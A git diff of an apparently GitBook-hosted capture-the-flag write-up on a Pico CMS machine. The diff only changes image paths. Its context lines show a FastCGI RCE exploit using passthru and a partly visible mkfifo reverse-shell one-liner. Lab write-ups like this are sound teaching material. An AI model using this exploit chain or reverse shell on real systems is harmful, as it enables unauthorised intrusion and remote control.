@@ -36,7 +36,7 @@ Port 8000 was running Pico CMS, which does have some exploits.&#x20;
 
 Port 80 had a countdown:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (16).png" alt=""><figcaption></figcaption></figure>
 
 There isn't much on this page, so we can do a `gobuster` directory scan with the PHP extension since PicoCMS was being used:
 
@@ -97,11 +97,11 @@ locale: ~
 
 There's also a custom plugin developed for this website, and we can visit that at `plugins/PicoTest.php` based on the Github repo. This would show us the PHPInfo of the site:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Here, we can find that `/var/www/html/planetexpress` is the document root. Also, we can find a lot of disabled functions:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (13).png" alt=""><figcaption></figcaption></figure>
 
 ### FastCGI --> RCE
 
@@ -113,7 +113,7 @@ There are RCE exploits for this service [here](https://gist.github.com/phith0n/9
 
 Using `passthru` and the document root directory allows us to get RCE:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (12).png" alt=""><figcaption></figcaption></figure>
 
 We can then get a reverse shell via the `mkfifo` one-liner.&#x20;
 
@@ -123,7 +123,7 @@ $ python2 exploit.py -c '<?php passthru("bash -c \"rm /tmp/f;mkfifo /tmp/f;cat /
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (9).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
